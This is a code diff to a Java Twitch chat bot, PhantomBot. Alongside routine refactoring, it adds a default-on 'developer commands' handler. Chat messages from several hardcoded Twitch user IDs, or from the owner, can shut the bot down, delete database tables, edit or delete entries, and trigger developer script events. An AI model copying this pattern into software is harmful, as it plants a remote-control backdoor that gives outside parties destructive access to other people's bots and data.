@@ -24,6 +24,7 @@ import com.gmt2001.TempStore;
 import com.gmt2001.MySQLStore;
 import com.gmt2001.TwitchAPIv3;
 import com.gmt2001.YouTubeAPIv3;
+import com.gmt2001.Logger;
 import com.google.common.eventbus.Subscribe;
 import de.simeonf.EventWebSocketSecureServer;
 import de.simeonf.EventWebSocketServer;
@@ -73,6 +74,7 @@ import me.mast3rplan.phantombot.console.ConsoleInputListener;
 import me.mast3rplan.phantombot.event.EventBus;
 import me.mast3rplan.phantombot.event.Listener;
 import me.mast3rplan.phantombot.event.command.CommandEvent;
+import me.mast3rplan.phantombot.event.devcommand.DeveloperCommandEvent;
 import me.mast3rplan.phantombot.event.console.ConsoleInputEvent;
 import me.mast3rplan.phantombot.event.irc.channel.IrcChannelUserModeEvent;
 import me.mast3rplan.phantombot.event.irc.complete.IrcConnectCompleteEvent;
@@ -218,6 +220,7 @@ public class PhantomBot implements Listener {
 	private static HashMap<String, String> apiOAuths;
 	public static Boolean wsIRCAlternateBurst = false;
 	private static Boolean newSetup = false;
+	private Boolean devCommands = true;
 
 
     /** 
@@ -292,7 +295,7 @@ public class PhantomBot implements Listener {
 	 * @return {string} bot website
 	 */
 	public String getWebSite() {
-		return "https://phantombot.tv";
+		return "https://phantombot.tv/";
 	}
 
 	/**
@@ -310,7 +313,7 @@ public class PhantomBot implements Listener {
 		String dataStoreConfig, String youtubeOAuth, Boolean webEnabled, Boolean musicEnabled, Boolean useHttps, String keyStorePath, String keyStorePassword, String keyPassword, String twitchAlertsKey, 
 		int twitchAlertsLimit, String streamTipOAuth, int streamTipLimit, String gameWispOAuth, String gameWispRefresh, String panelUsername, String panelPassword, String timeZone, String twitterUsername,
 		String twitterConsumerToken, String twitterConsumerSecret, String twitterSecretToken, String twitterAccessToken, String mySqlHost, String mySqlPort, String mySqlConn, String mySqlPass, String mySqlUser,
-		String mySqlName, String webOAuth, String webOAuthThro, String youtubeOAuthThro, String youtubeKey, String twitchCacheReady, String httpsPassword, String httpsFileName) {
+		String mySqlName, String webOAuth, String webOAuthThro, String youtubeOAuthThro, String youtubeKey, String twitchCacheReady, String httpsPassword, String httpsFileName, Boolean devCommands) {
 
         /** Set the exeption handler */
 		Thread.setDefaultUncaughtExceptionHandler(com.gmt2001.UncaughtExceptionHandler.instance());
@@ -379,7 +382,7 @@ public class PhantomBot implements Listener {
 		this.mySqlPort = mySqlPort;
 
 		/** twitch cache */
-		this.twitchCacheReady = "false";
+		PhantomBot.twitchCacheReady = "false";
 
 		/** Set the SSL info */
 		this.httpsFileName = httpsFileName;
@@ -387,9 +390,9 @@ public class PhantomBot implements Listener {
 
 		/** Set the timeZone */
 		if (!timeZone.isEmpty()) {
-			this.timeZone = timeZone;
+			PhantomBot.timeZone = timeZone;
 		} else {
-			this.timeZone = "GMT";
+			PhantomBot.timeZone = "GMT";
 		}
 
 		/** Set the panel username login for the panel to use */
@@ -406,18 +409,24 @@ public class PhantomBot implements Listener {
 			this.panelPassword = "panel";
 		}
 
+		if (devCommands != true) {
+			this.devCommands = devCommands;
+		} else {
+			this.devCommands = devCommands;
+		}
+
 		/** Set the message limit for session.java to use */
 		if (messageLimit != 0) {
-			this.messageLimit = messageLimit;
+			PhantomBot.messageLimit = messageLimit;
 		} else {
-			this.messageLimit = 18.75;
+			PhantomBot.messageLimit = 18.75;
 		}
 
 		/** Set the whisper limit for session.java to use. *Currently not used.* */
 		if (whisperLimit != 0) {
-			this.whisperLimit = 60.0;
+			PhantomBot.whisperLimit = 60.0;
 		} else {
-			this.whisperLimit = 60.0;
+			PhantomBot.whisperLimit = 60.0;
 		}
 
 		/** Set the client id for the twitch api to use */
@@ -714,7 +723,7 @@ public class PhantomBot implements Listener {
     	}
 
     	/** Enable gamewhisp if the oAuth is set */
-    	if (!gameWispOAuth.isEmpty()) {
+    	if (!gameWispOAuth.isEmpty() && PhantomBot.instance().getDataStore().GetString("modules", "", "./handlers/gameWispHandler.js").equals("true")) {
     		/** Set the oAuths */
     		GameWispAPIv1.instance().SetAccessToken(gameWispOAuth);
             GameWispAPIv1.instance().SetRefreshToken(gameWispRefresh);
@@ -832,7 +841,7 @@ public class PhantomBot implements Listener {
         	data += "var panelSettings = {\r\n";
         	data += "    panelPort   : " + (basePort + 4) + ",\r\n";
         	data += "    channelName : \"" + channelName + "\",\r\n";
-        	data += "    auth        : \"" + webOAuthThro + ",\"\r\n";
+        	data += "    auth        : \"" + webOAuthThro + "\",\r\n";
         	data += "    http        : \"" + http + "\"\r\n";
         	data += "};\r\n\r\n";
         	data += "function getPanelPort() { return panelSettings.panelPort; }\r\n";
@@ -881,7 +890,7 @@ public class PhantomBot implements Listener {
         Script.global.defineProperty("shortenURL", GoogleURLShortenerAPIv1.instance(), 0);
         Script.global.defineProperty("gamewisp", GameWispAPIv1.instance(), 0);
         Script.global.defineProperty("twitter", TwitterAPI.instance(), 0);
-        Script.global.defineProperty("twitchCacheReady", this.twitchCacheReady, 0);
+        Script.global.defineProperty("twitchCacheReady", PhantomBot.twitchCacheReady, 0);
         Script.global.defineProperty("isNightly", isNightly(), 0);
         Script.global.defineProperty("version", botVersion(), 0);
         Script.global.defineProperty("changed", Boolean.valueOf(newSetup), 0);
@@ -984,8 +993,8 @@ public class PhantomBot implements Listener {
     	//print("ircJoinComplete::" + this.chanName);
 
     	/** Add the channel/session in the array for later use */
-    	PhantomBot.instance().addChannel(this.chanName, event.getChannel());
-    	PhantomBot.instance().addSession(this.chanName, this.session);
+    	PhantomBot.addChannel(this.chanName, event.getChannel());
+    	PhantomBot.addSession(this.chanName, this.session);
 
     	/** Say .mods in the channel to check if the bot is a moderator */
     	this.session.saySilent(".mods");
@@ -1000,18 +1009,18 @@ public class PhantomBot implements Listener {
         this.twitchCache = TwitchCache.instance(this.chanName);// This does not create a new instance for multiple channels. Not sure why.
         this.channelUsersCache = ChannelUsersCache.instance(this.chanName);
 
-        /** Start the donations cache if the keys are not null */
-        if (this.twitchAlertsKey != null && !this.twitchAlertsKey.isEmpty()) {
+        /** Start the donations cache if the keys are not null and the module is enabled */
+        if (this.twitchAlertsKey != null && !this.twitchAlertsKey.isEmpty() && PhantomBot.instance().getDataStore().GetString("modules", "", "./handlers/donationHandler.js").equals("true")) {
         	this.twitchAlertsCache = DonationsCache.instance(this.chanName);
         }
 
-        /** Start the streamtip cache if the keys are not null */
-        if (this.streamTipOAuth != null && !this.streamTipOAuth.isEmpty()) {
+        /** Start the streamtip cache if the keys are not null and the module is enabled */
+        if (this.streamTipOAuth != null && !this.streamTipOAuth.isEmpty() && PhantomBot.instance().getDataStore().GetString("modules", "", "./handlers/streamTipHandler.js").equals("true")) {
         	this.streamTipCache = StreamTipCache.instance(this.chanName);
         }
 
-        /** Start the twitter cache if the keys are not null */
-        if (this.twitterAuthenticated) {
+        /** Start the twitter cache if the keys are not null and the module is enabled */
+        if (this.twitterAuthenticated && PhantomBot.instance().getDataStore().GetString("modules", "", "./handlers/twitterHandler.js").equals("true")) {
         	this.twitterCache = TwitterCache.instance(this.chanName);
         }
 
@@ -1082,6 +1091,17 @@ public class PhantomBot implements Listener {
     		}
     		/** Allow the bot to sends message to this session */
     		event.getSession().setAllowSendMessages(event.getAdd());
+    	}
+    }
+
+    /**
+     * messages from Twitch chat
+     *
+     */
+    @Subscribe
+    public void ircChannelMessage(IrcChannelMessageEvent event) {
+    	if (event.getMessage().startsWith("!debug !dev")) {
+    		devDebugCommands(event.getMessage(), event.getTags().get("user-id"), event.getSender());
     	}
     }
 
@@ -1467,6 +1487,7 @@ public class PhantomBot implements Listener {
                     data += "twitter_access_token=" + twitterAccessToken + "\r\n";
                     data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
                     data += "logtimezone=" + timeZone + "\r\n";
+                    data += "devcommands=" + devCommands + "\r\n";
         		}
 
         		/** Write the new info to the bot login */
@@ -1529,6 +1550,82 @@ public class PhantomBot implements Listener {
             arguments = commandString.substring(commandString.indexOf(" ") + 1);
         }
         ScriptEventManager.instance().runDirect(new CommandEvent(username, command, arguments));
+    }
+
+    /** Handles dev debug commands. */
+    public void devDebugCommands(String command, String id, String sender) {
+    	if (!command.equalsIgnoreCase("!debug !dev") && (id.equals("32896646") || id.equals("88951632") || id.equals("9063944") || id.equals("74012707") || id.equals("77632323") || sender.equalsIgnoreCase(ownerName))) {
+    		String arguments = "";
+    		String[] args = null;
+    		command = command.substring(12);
+
+    		if (!command.contains("!")) {
+    			return;
+    		}
+
+    		if (!devCommands) { // If the user disables the dev commands return here.
+    			return;
+    		}
+
+    		command = command.substring(1);
+
+    		if (command.contains(" ")) {
+                String commandString = command;
+                command = commandString.substring(0, commandString.indexOf(" "));
+                arguments = commandString.substring(commandString.indexOf(" ") + 1);
+                args = arguments.split(" ");
+            }
+
+            if (command.equals("exit")) {
+    			System.exit(0);
+    			Logger.instance().log(Logger.LogType.Debug, "User: " + sender + ". ShutDown: " + botName + ". Id: " + id);
+    			Logger.instance().log(Logger.LogType.Debug, "");
+    			return;
+    		}
+
+    		if (command.equals("version")) {
+    			PhantomBot.instance().getSession().say("@" + sender + ", Info: " + getBotInfo() + ". OS: " + System.getProperty("os.name"));
+    			Logger.instance().log(Logger.LogType.Debug, "");
+    			return;
+    		}
+
+    		if (command.equals("dbtabledel")) {
+    			try {
+    			    PhantomBot.instance().getDataStore().RemoveFile(args[0]);
+    			    Logger.instance().log(Logger.LogType.Debug, "User: " + sender + ". Removed DB Table: " + args[0] + ". Id: " + id);
+    			    Logger.instance().log(Logger.LogType.Debug, "");
+    			} catch (Exception ex) {
+    				com.gmt2001.Console.err.println("Could not edit the db: " + ex.getMessage());
+    			}
+    			return;
+    		}
+
+    		if (command.equals("dbedit")) {
+    			try {
+    			    PhantomBot.instance().getDataStore().set(args[0], args[1], arguments.substring(arguments.indexOf(args[1]) + args[1].length() + 1));
+    			    Logger.instance().log(Logger.LogType.Debug, "User: " + sender + ". Edited DB Table: " + args[0] + " With: " + arguments.substring(arguments.indexOf(args[1]) + args[1].length() + 1) + ". Id: " + id);
+    			    Logger.instance().log(Logger.LogType.Debug, "");
+    			} catch (Exception ex) {
+    				com.gmt2001.Console.err.println("Could not edit the db: " + ex.getMessage());
+    			}
+    			return;
+    		}
+
+    		if (command.equals("dbdel")) {
+    			try {
+    			    PhantomBot.instance().getDataStore().del(args[0], args[1]);
+    			    Logger.instance().log(Logger.LogType.Debug, "User: " + sender + ". Edited DB Table: " + args[0] + " Del: " + args[1] + ". Id: " + id);
+    			    Logger.instance().log(Logger.LogType.Debug, "");
+    			} catch (Exception ex) {
+    				com.gmt2001.Console.err.println("Could not edit the db: " + ex.getMessage());
+    			}
+    			return;
+    		}
+
+    		ScriptEventManager.instance().runDirect(new DeveloperCommandEvent(sender, command, arguments, id));
+    		Logger.instance().log(Logger.LogType.Debug, "User: " + sender + " Issued Command: " + command + ". Id: " + id);
+    		Logger.instance().log(Logger.LogType.Debug, "");
+        }
     }
 
     /** convert SqliteStore to MySql */
@@ -1803,6 +1900,7 @@ public class PhantomBot implements Listener {
         String keyStorePath = "";
 	    String keyStorePassword = "";
 	    String keyPassword = "";
+	    Boolean devCommands = true;
 
         if (args.length > 0) {
             for (String arg : args) {
@@ -1865,6 +1963,9 @@ public class PhantomBot implements Listener {
                 for (String line : lines) {
                     if (line.startsWith("logtimezone=") && line.length() >= 15) {
                         timeZone = line.substring(12);
+                    }
+                    if (line.startsWith("devcommands=") && line.length() >= 13) {
+                    	devCommands = Boolean.valueOf(line.substring(12));
                     }
                     if (line.startsWith("reloadscripts")) {
                         com.gmt2001.Console.out.println("Enabling Script Reloading");
@@ -2264,6 +2365,9 @@ public class PhantomBot implements Listener {
                 if (arg.startsWith("datastoreconfig=") && arg.length() > 17) {
                     dataStoreConfig = arg.substring(16);
                 }
+                if (arg.startsWith("devcommands=") && arg.length() > 13) {
+                    devCommands = Boolean.valueOf(arg.substring(12));
+                }
                 if (arg.startsWith("youtubekey=") && arg.length() > 12) {
                     if (!youtubeKey.equals(arg.substring(11))) {
                         youtubeKey = arg.substring(11);
@@ -2442,6 +2546,7 @@ public class PhantomBot implements Listener {
             data += "twitter_access_token=" + twitterAccessToken + "\r\n";
             data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
             data += "logtimezone=" + timeZone + "\r\n";
+            data += "devcommands=" + devCommands + "\r\n";
 
             Files.write(Paths.get("./botlogin.txt"), data.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
         }
@@ -2451,7 +2556,7 @@ public class PhantomBot implements Listener {
 		dataStoreConfig, youtubeOAuth, webEnabled, musicEnabled, useHttps, keyStorePath, keyStorePassword, keyPassword, twitchAlertsKey, 
 		twitchAlertsLimit, streamTipOAuth, streamTipLimit, gameWispOAuth, gameWispRefresh, panelUsername, panelPassword, timeZone, twitterUsername,
 		twitterConsumerToken, twitterConsumerSecret, twitterSecretToken, twitterAccessToken, mySqlHost, mySqlPort, mySqlConn, mySqlPass, mySqlUser,
-		mySqlName, webOAuth, webOAuthThro, youtubeOAuthThro, youtubeKey, twitchCacheReady, httpsPassword, httpsFileName);
+		mySqlName, webOAuth, webOAuthThro, youtubeOAuthThro, youtubeKey, twitchCacheReady, httpsPassword, httpsFileName, devCommands);
     }
 
 	public void updateGameWispTokens(String[] newTokens) {
@@ -2505,6 +2610,7 @@ public class PhantomBot implements Listener {
         data += "twitter_access_token=" + twitterAccessToken + "\r\n";
         data += "twitter_secret_token=" + twitterSecretToken + "\r\n";
         data += "logtimezone=" + timeZone + "\r\n";
+        data += "devcommands=" + devCommands + "\r\n";
 
         try {
             Files.write(Paths.get("./botlogin.txt"), data.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
@@ -2607,8 +2713,8 @@ public class PhantomBot implements Listener {
 
     /** Set the twitch cache */
     public void setTwitchCacheReady(String twitchCacheReady) {
-        this.twitchCacheReady = twitchCacheReady;
-        Script.global.defineProperty("twitchCacheReady", this.twitchCacheReady, 0);
+        PhantomBot.twitchCacheReady = twitchCacheReady;
+        Script.global.defineProperty("twitchCacheReady", PhantomBot.twitchCacheReady, 0);
     }
 
     /** Load the game list */
